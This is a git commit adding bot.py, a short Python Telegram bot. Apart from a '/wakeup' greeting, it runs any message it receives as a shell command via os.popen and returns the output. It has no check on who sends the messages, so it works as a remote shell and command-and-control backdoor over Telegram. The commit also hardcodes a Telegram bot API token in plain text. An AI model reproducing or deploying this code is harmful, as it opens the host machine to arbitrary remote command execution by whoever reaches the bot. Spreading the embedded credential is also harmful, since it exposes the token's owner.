914820141530eb8c9a6ff2bbf09a56c8db1e81f9
lumprv <lum.pireva@student.uni-pr.edu>
2021-03-27 21:33:17 +0100

    Communicating  with bot

--- bot.py
+++ bot.py
@@ -1,1 +1,31 @@
-API_KEY = "1778460102:AAFfnvI7Z1yfxvnGjGCk_OPkZtL_QmE88AQ"
+import time
+import os
+import telepot
+
+
+def send(chat_id, command):
+    text = os.popen(command).read()
+    bot.sendMessage(chat_id, text)
+
+
+def handle(msg):
+    chat_id = msg['chat']['id']
+    command = msg['text']
+
+    if command == '/wakeup':
+        bot.sendMessage(chat_id, str("Loading Modules..."))
+        time.sleep(1)
+        pwd = os.popen("pwd").read()
+        bot.sendMessage(chat_id, str("Running in" + str(pwd)))
+        time.sleep(1)
+        bot.sendMessage(chat_id, str("Awaiting Commands...."))
+    else:
+        send(chat_id, command)
+
+
+bot = telepot.Bot('1778460102:AAFfnvI7Z1yfxvnGjGCk_OPkZtL_QmE88AQ')
+bot.message_loop(handle)
+print('I am listening ...')
+
+while 1:
+    time.sleep(10)
